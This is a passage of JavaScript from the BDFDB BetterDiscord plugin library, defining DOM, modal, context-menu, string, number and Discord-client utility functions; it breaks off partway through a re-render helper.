		BDFDB.DOMUtils.remove = function (...eles) {
			for (let ele of eles.flat(10).filter(n => n)) {
				if (Node.prototype.isPrototypeOf(ele)) ele.remove();
				else if (NodeList.prototype.isPrototypeOf(ele)) {
					let nodes = Array.from(ele);
					while (nodes.length) nodes.shift().remove();
				}
				else if (typeof ele == "string") for (let c of ele.split(",")) if (c && (c = c.trim())) {
					let nodes = Array.from(document.querySelectorAll(c));
					while (nodes.length) nodes.shift().remove();
				}
			}
		};
		BDFDB.DOMUtils.create = function (html) {
			if (typeof html != "string" || !html.trim()) return null;
			let template = document.createElement("template");
			try {template.innerHTML = html.replace(/(?<!pre)>[\t\r\n]+<(?!pre)/g, "><");}
			catch (err) {template.innerHTML = html.replace(/>[\t\r\n]+<(?!pre)/g, "><");}
			if (template.content.childNodes.length == 1) return template.content.firstElementChild || template.content.firstChild;
			else {
				let wrapper = document.createElement("span");
				let nodes = Array.from(template.content.childNodes);
				while (nodes.length) wrapper.appendChild(nodes.shift());
				return wrapper;
			}
		};
		BDFDB.DOMUtils.getParent = function (listOrSelector, node) {
			let parent = null;
			if (Node.prototype.isPrototypeOf(node) && listOrSelector) {
				let list = NodeList.prototype.isPrototypeOf(listOrSelector) ? listOrSelector : typeof listOrSelector == "string" ? document.querySelectorAll(listOrSelector) : null;
				if (list) for (let listNode of list) if (listNode.contains(node)) {
					parent = listNode;
					break;
				}
			}
			return parent;
		};
		BDFDB.DOMUtils.setText = function (node, stringOrNode) {
			if (!node || !Node.prototype.isPrototypeOf(node)) return;
			let textnode = node.nodeType == Node.TEXT_NODE ? node : null;
			if (!textnode) for (let child of node.childNodes) if (child.nodeType == Node.TEXT_NODE || BDFDB.DOMUtils.containsClass(child, "BDFDB-textnode")) {
				textnode = child;
				break;
			}
			if (textnode) {
				if (Node.prototype.isPrototypeOf(stringOrNode) && stringOrNode.nodeType != Node.TEXT_NODE) {
					BDFDB.DOMUtils.addClass(stringOrNode, "BDFDB-textnode");
					node.replaceChild(stringOrNode, textnode);
				}
				else if (Node.prototype.isPrototypeOf(textnode) && textnode.nodeType != Node.TEXT_NODE) node.replaceChild(document.createTextNode(stringOrNode), textnode);
				else textnode.textContent = stringOrNode;
			}
			else node.appendChild(Node.prototype.isPrototypeOf(stringOrNode) ? stringOrNode : document.createTextNode(stringOrNode));
		};
		BDFDB.DOMUtils.getText = function (node) {
			if (!node || !Node.prototype.isPrototypeOf(node)) return;
			for (let child of node.childNodes) if (child.nodeType == Node.TEXT_NODE) return child.textContent;
		};
		BDFDB.DOMUtils.getRects = function (node) {
			let rects = {};
			if (Node.prototype.isPrototypeOf(node) && node.nodeType != Node.TEXT_NODE) {
				let hideNode = node;
				while (hideNode) {
					let hidden = BDFDB.DOMUtils.isHidden(hideNode);
					if (hidden) {
						BDFDB.DOMUtils.toggle(hideNode, true);
						hideNode.BDFDBgetRectsHidden = true;
					}
					hideNode = hideNode.parentElement;
				}
				rects = node.getBoundingClientRect();
				hideNode = node;
				while (hideNode) {
					if (hideNode.BDFDBgetRectsHidden) {
						BDFDB.DOMUtils.toggle(hideNode, false);
						delete hideNode.BDFDBgetRectsHidden;
					}
					hideNode = hideNode.parentElement;
				}
			}
			return rects;
		};
		BDFDB.DOMUtils.getHeight = function (node) {
			if (Node.prototype.isPrototypeOf(node) && node.nodeType != Node.TEXT_NODE) {
				let rects = BDFDB.DOMUtils.getRects(node);
				let style = getComputedStyle(node);
				return rects.height + parseInt(style.marginTop) + parseInt(style.marginBottom);
			}
			return 0;
		};
		BDFDB.DOMUtils.getInnerHeight = function (node) {
			if (Node.prototype.isPrototypeOf(node) && node.nodeType != Node.TEXT_NODE) {
				let rects = BDFDB.DOMUtils.getRects(node);
				let style = getComputedStyle(node);
				return rects.height - parseInt(style.paddingTop) - parseInt(style.paddingBottom);
			}
			return 0;
		};
		BDFDB.DOMUtils.getWidth = function (node) {
			if (Node.prototype.isPrototypeOf(node) && node.nodeType != Node.TEXT_NODE) {
				let rects = BDFDB.DOMUtils.getRects(node);
				let style = getComputedStyle(node);
				return rects.width + parseInt(style.marginLeft) + parseInt(style.marginRight);
			}
			return 0;
		};
		BDFDB.DOMUtils.getInnerWidth = function (node) {
			if (Node.prototype.isPrototypeOf(node) && node.nodeType != Node.TEXT_NODE) {
				let rects = BDFDB.DOMUtils.getRects(node);
				let style = getComputedStyle(node);
				return rects.width - parseInt(style.paddingLeft) - parseInt(style.paddingRight);
			}
			return 0;
		};
		BDFDB.DOMUtils.appendWebScript = function (url, container) {
			if (typeof url != "string") return;
			if (!container && !document.head.querySelector("bd-head bd-scripts")) document.head.appendChild(BDFDB.DOMUtils.create(`<bd-head><bd-scripts></bd-scripts></bd-head>`));
			container = container || document.head.querySelector("bd-head bd-scripts") || document.head;
			container = Node.prototype.isPrototypeOf(container) ? container : document.head;
			BDFDB.DOMUtils.removeWebScript(url, container);
			let script = document.createElement("script");
			script.src = url;
			container.appendChild(script);
		};
		BDFDB.DOMUtils.removeWebScript = function (url, container) {
			if (typeof url != "string") return;
			container = container || document.head.querySelector("bd-head bd-scripts") || document.head;
			container = Node.prototype.isPrototypeOf(container) ? container : document.head;
			BDFDB.DOMUtils.remove(container.querySelectorAll(`script[src="${url}"]`));
		};
		BDFDB.DOMUtils.appendWebStyle = function (url, container) {
			if (typeof url != "string") return;
			if (!container && !document.head.querySelector("bd-head bd-styles")) document.head.appendChild(BDFDB.DOMUtils.create(`<bd-head><bd-styles></bd-styles></bd-head>`));
			container = container || document.head.querySelector("bd-head bd-styles") || document.head;
			container = Node.prototype.isPrototypeOf(container) ? container : document.head;
			BDFDB.DOMUtils.removeWebStyle(url, container);
			container.appendChild(BDFDB.DOMUtils.create(`<link type="text/css" rel="stylesheet" href="${url}"></link>`));
		};
		BDFDB.DOMUtils.removeWebStyle = function (url, container) {
			if (typeof url != "string") return;
			container = container || document.head.querySelector("bd-head bd-styles") || document.head;
			container = Node.prototype.isPrototypeOf(container) ? container : document.head;
			BDFDB.DOMUtils.remove(container.querySelectorAll(`link[href="${url}"]`));
		};
		BDFDB.DOMUtils.appendLocalStyle = function (id, css, container) {
			if (typeof id != "string" || typeof css != "string") return;
			if (!container && !document.head.querySelector("bd-head bd-styles")) document.head.appendChild(BDFDB.DOMUtils.create(`<bd-head><bd-styles></bd-styles></bd-head>`));
			container = container || document.head.querySelector("bd-head bd-styles") || document.head;
			container = Node.prototype.isPrototypeOf(container) ? container : document.head;
			BDFDB.DOMUtils.removeLocalStyle(id, container);
			container.appendChild(BDFDB.DOMUtils.create(`<style id="${id}CSS">${css.replace(/\t|\r|\n/g,"")}</style>`));
		};
		BDFDB.DOMUtils.removeLocalStyle = function (id, container) {
			if (typeof id != "string") return;
			container = container || document.head.querySelector("bd-head bd-styles") || document.head;
			container = Node.prototype.isPrototypeOf(container) ? container : document.head;
			BDFDB.DOMUtils.remove(container.querySelectorAll(`style[id="${id}CSS"]`));
		};
		
		BDFDB.ModalUtils = {};
		BDFDB.ModalUtils.open = function (plugin, config) {
			if (!BDFDB.ObjectUtils.is(plugin) || !BDFDB.ObjectUtils.is(config)) return;
			let modalInstance, modalProps, cancels = [], closeModal = _ => {
				if (BDFDB.ObjectUtils.is(modalProps) && typeof modalProps.onClose == "function") modalProps.onClose();
			};
			
			let titleChildren = [], headerChildren = [], contentChildren = [], footerChildren = [];
			
			if (typeof config.text == "string") {
				config.contentClassName = BDFDB.DOMUtils.formatClassName(config.contentClassName, BDFDB.disCN.modaltextcontent);
				contentChildren.push(BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextElement, {
					children: config.text
				}));
			}
			
			if (config.children) {
				let tabBarItems = [], tabIns = {};
				for (let child of [config.children].flat(10).filter(n => n)) if (Internal.LibraryModules.React.isValidElement(child)) {
					if (child.type == Internal.LibraryComponents.ModalComponents.ModalTabContent) {
						if (!tabBarItems.length) child.props.open = true;
						else delete child.props.open;
						let ref = typeof child.ref == "function" ? child.ref : (_ => {});
						child.ref = instance => {
							ref(instance);
							if (instance) tabIns[child.props.tab] = instance;
						};
						tabBarItems.push({value: child.props.tab});
					}
					contentChildren.push(child);
				}
				if (tabBarItems.length) headerChildren.push(BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
					className: BDFDB.disCN.tabbarcontainer,
					align: Internal.LibraryComponents.Flex.Align.CENTER,
					children: [
						BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TabBar, {
							className: BDFDB.disCN.tabbar,
							itemClassName: BDFDB.disCN.tabbaritem,
							type: Internal.LibraryComponents.TabBar.Types.TOP,
							items: tabBarItems,
							onItemSelect: value => {
								for (let key in tabIns) {
									if (key == value) tabIns[key].props.open = true;
									else delete tabIns[key].props.open;
								}
								BDFDB.ReactUtils.forceUpdate(BDFDB.ObjectUtils.toArray(tabIns));
							}
						}),
						config.tabBarChildren
					].flat(10).filter(n => n)
				}));
			}
			
			if (BDFDB.ArrayUtils.is(config.buttons)) for (let button of config.buttons) {
				let contents = typeof button.contents == "string" && button.contents;
				if (contents) {
					let color = typeof button.color == "string" && Internal.LibraryComponents.Button.Colors[button.color.toUpperCase()];
					let look = typeof button.look == "string" && Internal.LibraryComponents.Button.Looks[button.look.toUpperCase()];
					let click = typeof button.click == "function" ? button.click : (typeof button.onClick == "function" ? button.onClick : _ => {});
					
					if (button.cancel) cancels.push(click);
					
					footerChildren.push(BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Button, BDFDB.ObjectUtils.exclude(Object.assign({}, button, {
						look: look || (color ? Internal.LibraryComponents.Button.Looks.FILLED : Internal.LibraryComponents.Button.Looks.LINK),
						color: color || Internal.LibraryComponents.Button.Colors.PRIMARY,
						onClick: _ => {
							if (button.close) closeModal();
							if (!(button.close && button.cancel)) click(modalInstance);
						},
						children: contents
					}), "click", "close", "cancel", "contents")));
				}
			}
			
			contentChildren = contentChildren.concat(config.contentChildren).filter(n => n && (typeof n == "string" || BDFDB.ReactUtils.isValidElement(n)));
			titleChildren = titleChildren.concat(config.titleChildren).filter(n => n && (typeof n == "string" || BDFDB.ReactUtils.isValidElement(n)));
			headerChildren = headerChildren.concat(config.headerChildren).filter(n => n && (typeof n == "string" || BDFDB.ReactUtils.isValidElement(n)));
			footerChildren = footerChildren.concat(config.footerChildren).filter(n => n && (typeof n == "string" || BDFDB.ReactUtils.isValidElement(n)));
			
			if (contentChildren.length) {
				if (typeof config.onOpen != "function") config.onOpen = _ => {};
				if (typeof config.onClose != "function") config.onClose = _ => {};
				
				let name = plugin.name || (typeof plugin.getName == "function" ? plugin.getName() : null);
				name = typeof name == "string" ? name : null;
				let oldTransitionState = 0;
				Internal.LibraryModules.ModalUtils.openModal(props => {
					modalProps = props;
					return BDFDB.ReactUtils.createElement(class BDFDB_Modal extends Internal.LibraryModules.React.Component {
						render() {
							return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.ModalComponents.ModalRoot, {
								className: BDFDB.DOMUtils.formatClassName(name && `${name}-modal`, BDFDB.disCN.modalwrapper, config.className),
								size: typeof config.size == "string" && Internal.LibraryComponents.ModalComponents.ModalSize[config.size.toUpperCase()] || Internal.LibraryComponents.ModalComponents.ModalSize.SMALL,
								transitionState: props.transitionState,
								children: [
									BDFDB.ReactUtils.createElement(Internal.LibraryComponents.ModalComponents.ModalHeader, {
										className: BDFDB.DOMUtils.formatClassName(config.headerClassName, config.shade && BDFDB.disCN.modalheadershade, headerChildren.length && BDFDB.disCN.modalheaderhassibling),
										separator: config.headerSeparator || false,
										children: [
											BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex.Child, {
												children: [
													BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormTitle, {
														tag: Internal.LibraryComponents.FormComponents.FormTitle.Tags.H4,
														children: config.header
													}),
													BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextElement, {
														size: Internal.LibraryComponents.TextElement.Sizes.SIZE_12,
														children: typeof config.subHeader == "string" || BDFDB.ReactUtils.isValidElement(config.subHeader) ? config.subHeader : (name || "")
													})
												]
											}),
											titleChildren,
											BDFDB.ReactUtils.createElement(Internal.LibraryComponents.ModalComponents.ModalCloseButton, {
												onClick: closeModal
											})
										].flat(10).filter(n => n)
									}),
									headerChildren.length ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
										grow: 0,
										shrink: 0,
										children: headerChildren
									}) : null,
									BDFDB.ReactUtils.createElement(Internal.LibraryComponents.ModalComponents.ModalContent, {
										className: config.contentClassName,
										scroller: config.scroller,
										direction: config.direction,
										content: config.content,
										children: contentChildren
									}),
									footerChildren.length ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.ModalComponents.ModalFooter, {
										className: config.footerClassName,
										direction: config.footerDirection,
										children: footerChildren
									}) : null
								]
							});
						}
						componentDidMount() {
							modalInstance = this;
							if (props.transitionState == 1 && props.transitionState > oldTransitionState) config.onOpen(modalInstance);
							oldTransitionState = props.transitionState;
						}
						componentWillUnmount() {
							if (props.transitionState == 3) {
								for (let cancel of cancels) cancel(modalInstance);
								config.onClose(modalInstance);
							}
						}
					}, props, true);
				}, {
					onCloseRequest: closeModal
				});
			}
		};
		BDFDB.ModalUtils.confirm = function (plugin, text, callback) {
			if (!BDFDB.ObjectUtils.is(plugin) || typeof text != "string") return;
			BDFDB.ModalUtils.open(plugin, {
				text: text,
				header: BDFDB.LanguageUtils.LibraryStrings.confirm,
				className: BDFDB.disCN.modalconfirmmodal,
				scroller: false,
				buttons: [
					{contents: BDFDB.LanguageUtils.LanguageStrings.OKAY, close: true, color: "RED", onClick: callback},
					{contents: BDFDB.LanguageUtils.LanguageStrings.CANCEL, close: true}
				]
			});
		};
	
		const RealMenuItems = BDFDB.ModuleUtils.findByProperties("MenuItem", "MenuGroup");
		BDFDB.ContextMenuUtils = {};
		BDFDB.ContextMenuUtils.open = function (plugin, e, children) {
			Internal.LibraryModules.ContextMenuUtils.openContextMenu(e, _ => BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Menu, {
				navId: "bdfdb-context",
				onClose: Internal.LibraryModules.ContextMenuUtils.closeContextMenu,
				children: children
			}, true));
		};
		BDFDB.ContextMenuUtils.close = function (nodeOrInstance) {
			if (!BDFDB.ObjectUtils.is(nodeOrInstance)) return;
			let instance = BDFDB.ReactUtils.findOwner(nodeOrInstance, {props: "closeContextMenu", up: true});
			if (BDFDB.ObjectUtils.is(instance) && instance.props && typeof instance.props.closeContextMenu == "function") instance.props.closeContextMenu();
			else Internal.LibraryModules.ContextMenuUtils.closeContextMenu();
		};
		BDFDB.ContextMenuUtils.createItem = function (component, props = {}) {
			if (!component) return null;
			else {
				if (props.render || props.persisting || BDFDB.ObjectUtils.is(props.popoutProps) || (typeof props.color == "string" && !DiscordClasses[`menu${props.color.toLowerCase()}`])) component = Internal.MenuItem;
				if (BDFDB.ObjectUtils.toArray(RealMenuItems).some(c => c == component)) return BDFDB.ReactUtils.createElement(component, props);
				else return BDFDB.ReactUtils.createElement(RealMenuItems.MenuItem, {
					id: props.id,
					disabled: props.disabled,
					customItem: true,
					render: menuItemProps => {
						if (!props.state) props.state = BDFDB.ObjectUtils.extract(props, "checked", "value");
						return BDFDB.ReactUtils.createElement(Internal.CustomMenuItemWrapper, {
							disabled: props.disabled,
							childProps: Object.assign({}, props, menuItemProps, {color: props.color}),
							children: component
						}, true);
					}
				});
			}
		};
		BDFDB.ContextMenuUtils.createItemId = function (...strings) {
			return strings.map(s => typeof s == "number" ? s.toString() : s).filter(s => typeof s == "string").map(s => s.toLowerCase().replace(/\s/, "-")).join("-");
		};
		BDFDB.ContextMenuUtils.findItem = function (returnvalue, config) {
			if (!returnvalue || !BDFDB.ObjectUtils.is(config) || !config.label && !config.id) return [null, -1];
			config.label = config.label && [config.label].flat().filter(n => n);
			config.id = config.id && [config.id].flat().filter(n => n);
			let contextMenu = BDFDB.ReactUtils.findChild(returnvalue, {props: "navId"}) || (BDFDB.ArrayUtils.is(returnvalue) ? {props: {children: returnvalue}} : null);
			if (contextMenu) {
				for (let i in contextMenu.props.children) {
					if (contextMenu.props.children[i] && contextMenu.props.children[i].type == RealMenuItems.MenuGroup) {
						if (BDFDB.ArrayUtils.is(contextMenu.props.children[i].props.children)) {
							for (let j in contextMenu.props.children[i].props.children) if (check(contextMenu.props.children[i].props.children[j])) {
								if (config.group) return [contextMenu.props.children, parseInt(i)];
								else return [contextMenu.props.children[i].props.children, parseInt(j)];
							}
						}
						else if (contextMenu.props.children[i] && contextMenu.props.children[i].props) {
							if (check(contextMenu.props.children[i].props.children)) {
								if (config.group) return [contextMenu.props.children, parseInt(i)];
								else {
									contextMenu.props.children[i].props.children = [contextMenu.props.children[i].props.children];
									return [contextMenu.props.children[i].props.children, 0];
								}
							}
							else if (contextMenu.props.children[i].props.children && contextMenu.props.children[i].props.children.props && BDFDB.ArrayUtils.is(contextMenu.props.children[i].props.children.props.children)) {
								for (let j in contextMenu.props.children[i].props.children.props.children) if (check(contextMenu.props.children[i].props.children.props.children[j])) {
									if (config.group) return [contextMenu.props.children, parseInt(i)];
									else return [contextMenu.props.children[i].props.children.props.children, parseInt(j)];
								}
							}
						}
					}
					else if (check(contextMenu.props.children[i])) return [contextMenu.props.children, parseInt(i)];
				}
				return [contextMenu.props.children, -1];
			}
			return [null, -1];
			function check (child) {
				if (!child) return false;
				let props = child.stateNode ? child.stateNode.props : child.props;
				if (!props) return false;
				return config.id && config.id.some(key => props.id == key) || config.label && config.label.some(key => props.label == key);
			}
		};

		BDFDB.StringUtils = {};
		BDFDB.StringUtils.htmlEscape = function (string) {
			let ele = document.createElement("div");
			ele.innerText = string;
			return ele.innerHTML;
		};
		BDFDB.StringUtils.regEscape = function (string) {
			return typeof string == "string" && string.replace(/([\-\/\\\^\$\*\+\?\.\(\)\|\[\]\{\}])/g, "\\$1");
		};
		BDFDB.StringUtils.insertNRST = function (string) {
			return typeof string == "string" && string.replace(/\\r/g, "\r").replace(/\\n/g, "\n").replace(/\\t/g, "\t").replace(/\\s/g, " ");
		};
		BDFDB.StringUtils.highlight = function (string, searchstring, prefix = `<span class="${BDFDB.disCN.highlight}">`, suffix = `</span>`) {
			if (typeof string != "string" || !searchstring || searchstring.length < 1) return string;
			let offset = 0, original = string;
			BDFDB.ArrayUtils.getAllIndexes(string.toUpperCase(), searchstring.toUpperCase()).forEach(index => {
				let d1 = offset * (prefix.length + suffix.length);
				index = index + d1;
				let d2 = index + searchstring.length;
				let d3 = [-1].concat(BDFDB.ArrayUtils.getAllIndexes(string.substring(0, index), "<"));
				let d4 = [-1].concat(BDFDB.ArrayUtils.getAllIndexes(string.substring(0, index), ">"));
				if (d3[d3.length - 1] > d4[d4.length - 1]) return;
				string = string.substring(0, index) + prefix + string.substring(index, d2) + suffix + string.substring(d2);
				offset++;
			});
			return string || original;
		};
		BDFDB.StringUtils.findMatchCaseless = function (match, string, any) {
			if (typeof match != "string" || typeof string != "string" || !match || !string) return "";
			match = BDFDB.StringUtils.regEscape(match);
			let exec = (new RegExp(any ? `([\\n\\r\\s]+${match})|(^${match})` : `([\\n\\r\\s]+${match}[\\n\\r\\s]+)|([\\n\\r\\s]+${match}$)|(^${match}[\\n\\r\\s]+)|(^${match}$)`, "i")).exec(string);
			return exec && typeof exec[0] == "string" && exec[0].replace(/[\n\r\s]/g, "") || "";
		};
		BDFDB.StringUtils.equalCase = function (match, string) {
			if (typeof match != "string" || typeof string != "string") return "";
			let first = match.charAt(0);
			return first != first.toUpperCase() ? (string.charAt(0).toLowerCase() + string.slice(1)) : first != first.toLowerCase() ? (string.charAt(0).toUpperCase() + string.slice(1)) : string;
		};
		BDFDB.StringUtils.extractSelection = function (original, selection) {
			if (typeof original != "string") return "";
			if (typeof selection != "string") return original;
			let s = [], f = [], wrong = 0, canceled = false, done = false;
			for (let i of BDFDB.ArrayUtils.getAllIndexes(original, selection[0])) if (!done) {
				while (i <= original.length && !done) {
					let subSelection = selection.slice(s.filter(n => n != undefined).length);
					if (!subSelection && s.length - 20 <= selection.length) done = true;
					else for (let j in subSelection) if (!done && !canceled) {
						if (original[i] == subSelection[j]) {
							s[i] = subSelection[j];
							f[i] = subSelection[j];
							wrong = 0;
							if (i == original.length) done = true;
						}
						else {
							s[i] = null;
							f[i] = original[i];
							wrong++;
							if (wrong > 4) {
								s = [], f = [], wrong = 0, canceled = true;
								break;
							}
						}
						break;
					}
					canceled = false;
					i++;
				}
			}
			if (s.filter(n => n).length) {
				let reverseS = [].concat(s).reverse(), i = 0, j = 0;
				for (let k in s) {
					if (s[k] == null) i = parseInt(k) + 1;
					else break;
				}
				for (let k in reverseS) {
					if (reverseS[k] == null) j = parseInt(k) + 1;
					else break;
				}
				return f.slice(i, f.length - j).join("");
			}
			else return original;
		};
		
		BDFDB.SlateUtils = {};
		BDFDB.SlateUtils.isRichValue = function (richValue) {
			return richValue && typeof richValue == "object" && BDFDB.SlateUtils.toRichValue("").constructor.prototype.isPrototypeOf(richValue);
		};
		BDFDB.SlateUtils.toTextValue = function (richValue) {
			return BDFDB.SlateUtils.isRichValue(richValue) ? Internal.LibraryModules.SlateTextUtils.toTextValue(richValue) : "";
		};
		BDFDB.SlateUtils.toRichValue = function (string) {
			return typeof string == "string" ? Internal.LibraryModules.SlateRichUtils.toRichValue(string) : null;
		};
		
		BDFDB.NumberUtils = {};
		BDFDB.NumberUtils.formatBytes = function (bytes, sigDigits) {
			bytes = parseInt(bytes);
			if (isNaN(bytes) || bytes < 0) return "0 Bytes";
			if (bytes == 1) return "1 Byte";
			let size = Math.floor(Math.log(bytes) / Math.log(1024));
			return parseFloat((bytes / Math.pow(1024, size)).toFixed(sigDigits < 1 ? 0 : sigDigits > 20 ? 20 : sigDigits || 2)) + " " + ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"][size];
		};
		BDFDB.NumberUtils.mapRange = function (from, to, value) {
			if (parseFloat(value) < parseFloat(from[0])) return parseFloat(to[0]);
			else if (parseFloat(value) > parseFloat(from[1])) return parseFloat(to[1]);
			else return parseFloat(to[0]) + (parseFloat(value) - parseFloat(from[0])) * (parseFloat(to[1]) - parseFloat(to[0])) / (parseFloat(from[1]) - parseFloat(from[0]));
		};
		BDFDB.NumberUtils.generateId = function (array) {
			array = BDFDB.ArrayUtils.is(array) ? array : [];
			let id = Math.floor(Math.random() * 10000000000000000);
			if (array.includes(id)) return BDFDB.NumberUtils.generateId(array);
			else {
				array.push(id);
				return id;
			}
		};
		BDFDB.NumberUtils.compareVersions = function (newV, oldV) {
			if (!newV || !oldV) return true;
			newV = newV.toString().replace(/["'`]/g, "").split(/,|\./g).map(n => parseInt(n)).filter(n => (n || n == 0) && !isNaN(n));
			oldV = oldV.toString().replace(/["'`]/g, "").split(/,|\./g).map(n => parseInt(n)).filter(n => (n || n == 0) && !isNaN(n));
			let length = Math.max(newV.length, oldV.length);
			if (!length) return true;
			if (newV.length > oldV.length) {
				let tempArray = new Array(newV.length - oldV.length);
				for (let i = 0; i < tempArray.length; i++) tempArray[i] = 0;
				oldV = tempArray.concat(oldV);
			}
			else if (newV.length < oldV.length) {
				let tempArray = new Array(oldV.length - newV.length);
				for (let i = 0; i < tempArray.length; i++) tempArray[i] = 0;
				newV = tempArray.concat(newV);
			}
			for (let i = 0; i < length; i++) for (let iOutdated = false, j = 0; j <= i; j++) {
				if (j == i && newV[j] < oldV[j]) return false;
				if (j < i) iOutdated = newV[j] == oldV[j];
				if ((j == 0 || iOutdated) && j == i && newV[j] > oldV[j]) return true;
			}
			return false;
		};
		BDFDB.NumberUtils.getVersionDifference = function (newV, oldV) {
			if (!newV || !oldV) return false;
			newV = newV.toString().replace(/["'`]/g, "").split(/,|\./g).map(n => parseInt(n)).filter(n => (n || n == 0) && !isNaN(n));
			oldV = oldV.toString().replace(/["'`]/g, "").split(/,|\./g).map(n => parseInt(n)).filter(n => (n || n == 0) && !isNaN(n));
			let length = Math.max(newV.length, oldV.length);
			if (!length) return false;
			if (newV.length > oldV.length) {
				let tempArray = new Array(newV.length - oldV.length);
				for (let i = 0; i < tempArray.length; i++) tempArray[i] = 0;
				oldV = tempArray.concat(oldV);
			}
			else if (newV.length < oldV.length) {
				let tempArray = new Array(oldV.length - newV.length);
				for (let i = 0; i < tempArray.length; i++) tempArray[i] = 0;
				newV = tempArray.concat(newV);
			}
			let oldValue = 0, newValue = 0;
			for (let i in oldV.reverse()) oldValue += (oldV[i] * (10 ** i));
			for (let i in newV.reverse()) newValue += (newV[i] * (10 ** i));
			return (newValue - oldValue) / (10 ** (length-1));
		};

		BDFDB.DiscordUtils = {};
		BDFDB.DiscordUtils.openLink = function (url, config = {}) {
			if ((config.inBuilt || config.inBuilt === undefined && Internal.settings.general.useChromium) && Internal.LibraryRequires.electron && Internal.LibraryRequires.electron.remote) {
				let browserWindow = new Internal.LibraryRequires.electron.remote.BrowserWindow({
					frame: true,
					resizeable: true,
					show: true,
					darkTheme: BDFDB.DiscordUtils.getTheme() == BDFDB.disCN.themedark,
					webPreferences: {
						nodeIntegration: false,
						nodeIntegrationInWorker: false
					}
				});
				browserWindow.setMenu(null);
				browserWindow.loadURL(url);
				if (config.minimized) browserWindow.minimize(null);
			}
			else window.open(url, "_blank");
		};
		window.DiscordNative && window.DiscordNative.app && window.DiscordNative.app.getPath("appData").then(path => {BDFDB.DiscordUtils.getFolder.base = path;});
		BDFDB.DiscordUtils.getFolder = function () {
			if (!BDFDB.DiscordUtils.getFolder.base) return "";
			else if (BDFDB.DiscordUtils.getFolder.folder) return BDFDB.DiscordUtils.getFolder.folder;
			else {
				let folder;
				try {
					let build = BDFDB.DiscordUtils.getBuild();
					build = "discord" + (build == "stable" ? "" : build);
					folder = Internal.LibraryRequires.path.resolve(BDFDB.DiscordUtils.getFolder.base, build, BDFDB.DiscordUtils.getVersion());
				} 
				catch (err) {folder = BDFDB.DiscordUtils.getFolder.base;}
				return BDFDB.DiscordUtils.getFolder.folder = folder;
			}
		};
		BDFDB.DiscordUtils.getBuild = function () {
			if (BDFDB.DiscordUtils.getBuild.build) return BDFDB.DiscordUtils.getBuild.build;
			else {
				let build;
				try {build = window.DiscordNative.app.getReleaseChannel();} 
				catch (err) {
					let version = BDFDB.DiscordUtils.getVersion();
					if (version) {
						version = version.split(".");
						if (version.length == 3 && !isNaN(version = parseInt(version[2]))) build = version > 300 ? "stable" : version > 200 ? "canary" : "ptb";
						else build = "stable";
					}
					else build = "stable";
				}
				return BDFDB.DiscordUtils.getBuild.build = build;
			}
		};
		BDFDB.DiscordUtils.getVersion = function () {
			if (BDFDB.DiscordUtils.getVersion.version) return BDFDB.DiscordUtils.getVersion.version;
			else {
				let version;
				try {version = window.DiscordNative.app.getVersion();}
				catch (err) {version = "999.999.9999";}
				return BDFDB.DiscordUtils.getVersion.version = version;
			}
		};
		BDFDB.DiscordUtils.isDevModeEnabled = function () {
			return BDFDB.DiscordUtils.getSettings("developerMode");
		};
		BDFDB.DiscordUtils.getExperiment = function (id) {
			if (!id) return null;
			const module = BDFDB.ModuleUtils.find(m => m.definition && m.definition.defaultConfig && m.definition.defaultConfig[id] != null && typeof m.getCurrentConfig == "function" && m);
			return module && (module.getCurrentConfig({}) || {})[id];
		};
		BDFDB.DiscordUtils.getTheme = function () {
			return BDFDB.DiscordUtils.getSettings("theme") != "dark" ? BDFDB.disCN.themelight : BDFDB.disCN.themedark;
		};
		BDFDB.DiscordUtils.getMode = function () {
			return BDFDB.DiscordUtils.getSettings("messageDisplayCompact") ? "compact" : "cozy";
		};
		BDFDB.DiscordUtils.getSettings = function (key) {
			if (!key) return null;
			else if (Internal.LibraryModules.SettingsUtils && (Internal.LibraryModules.SettingsUtils[key] || Internal.LibraryModules.SettingsUtils[key + "DoNotUseYet"])) return (Internal.LibraryModules.SettingsUtils[key] || Internal.LibraryModules.SettingsUtils[key + "DoNotUseYet"]).getSetting();
			else {
				const value = Internal.LibraryModules.SettingsStore.getAllSettings()[key.slice(0, 1).toLowerCase() + key.slice(1)];
				return value != undefined ? value: null;
			}
		};
		BDFDB.DiscordUtils.setSettings = function (key, value) {
			if (!key) return;
			else if (Internal.LibraryModules.SettingsUtils && (Internal.LibraryModules.SettingsUtils[key] || Internal.LibraryModules.SettingsUtils[key + "DoNotUseYet"])) (Internal.LibraryModules.SettingsUtils[key] || Internal.LibraryModules.SettingsUtils[key + "DoNotUseYet"]).updateSetting(value);
			else Internal.LibraryModules.SettingsUtilsOld.updateRemoteSettings({[key.slice(0, 1).toLowerCase() + key.slice(1)]: value});
		};
		BDFDB.DiscordUtils.getZoomFactor = function () {
			let aRects = BDFDB.DOMUtils.getRects(document.querySelector(BDFDB.dotCN.appmount));
			let widthZoom = Math.round(100 * window.outerWidth / aRects.width);
			let heightZoom = Math.round(100 * window.outerHeight / aRects.height);
			return widthZoom < heightZoom ? widthZoom : heightZoom;
		};
		BDFDB.DiscordUtils.getFontScale = function () {
			return parseInt(document.firstElementChild.style.fontSize.replace("%", ""));
		};
		BDFDB.DiscordUtils.shake = function () {
			BDFDB.ReactUtils.findOwner(document.querySelector(BDFDB.dotCN.appcontainer), {name: "Shakeable", unlimited: true, up: true}).shake();
		};
		BDFDB.DiscordUtils.rerenderAll = function (instant) {
			BDFDB.TimeUtils.clear(BDFDB.DiscordUtils.rerenderAll.timeout);
			BDFDB.DiscordUtils.rerenderAll.timeout = BDFDB.TimeUtils.timeout(_ => {
				let ShakeableIns = BDFDB.ReactUtils.findOwner(document.querySelector(BDFDB.dotCN.appcontainer), {name: "Shakeable", unlimited: true, up: true});
				let ShakeablePrototype = BDFDB.ObjectUtils.get(ShakeableIns, `${BDFDB.ReactUtils.instanceKey}.type.prototype`);
				if (ShakeableIns && ShakeablePrototype) {
